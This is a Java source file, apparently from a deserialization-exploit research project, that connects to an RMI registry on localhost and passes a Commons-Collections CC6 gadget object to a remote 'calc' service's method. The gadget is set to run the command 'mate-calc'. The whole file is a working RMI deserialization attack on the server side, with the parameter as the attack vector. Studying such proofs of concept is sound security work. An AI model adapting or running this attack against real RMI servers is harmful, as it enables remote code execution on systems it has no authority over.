package xyz.eki.marshalexp.rmi.attack;

import com.dr34d.ICalc;
import xyz.eki.marshalexp.poc.CC6;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class AttackServerByParameters {
    public static void main(String[] args) {
        InvokeEqu();
    }
    public static void InvokeEqu(){
        try {
            Registry registry = LocateRegistry.getRegistry("localhost", 1099);
            ICalc calc = (ICalc) registry.lookup("calc");
            System.out.println(calc);
            System.out.println(calc.equ(new CC6().getPocObject("mate-calc"),null));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
